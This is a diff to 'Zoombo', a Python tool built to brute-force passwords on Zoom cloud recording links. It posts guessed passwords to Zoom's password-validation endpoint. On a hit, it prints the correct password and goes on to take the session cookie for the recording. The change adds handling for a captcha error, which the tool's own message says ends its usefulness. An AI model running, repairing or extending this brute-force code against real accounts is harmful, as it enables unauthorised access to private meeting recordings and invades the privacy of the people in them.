@@ -129,8 +129,11 @@ class Zoombo:
         login_url = f"https://{self.get_org_id_from_url(url)}.zoom.us/rec/validate_meet_passwd"
         login_request = requests.post(f"{login_url}", data=data, headers=form_submit_headers)
 
-        # Step 1: Login - Successful
-        if login_request.status_code == 200 and json.loads(login_request.text).get('status'):
+        # Step 1: Login - Successful. Or not.
+        status = json.loads(login_request.text).get('status')
+        result = json.loads(login_request.text).get('result')
+
+        if login_request.status_code == 200 and status and not result == "captcha_error":
             self.c_print(f"[***] Brute Force successful! Correct password is: {password}")
             # We found a valid request. Now we need to get the cookie it gives us.
             recording_name = self.get_recording_id_from_url(url)
@@ -169,6 +172,8 @@ class Zoombo:
             else:
                 self.c_print(f"[--] Failed to Brute Force URL")
         # Password incorrect.
+        elif result == "captcha_error":
+            self.c_print(f"[?] Program no longer functional due to recaptcha presence. Stop running it")
         else:
             self.c_print(f"[?] Password failed; {password}")
 
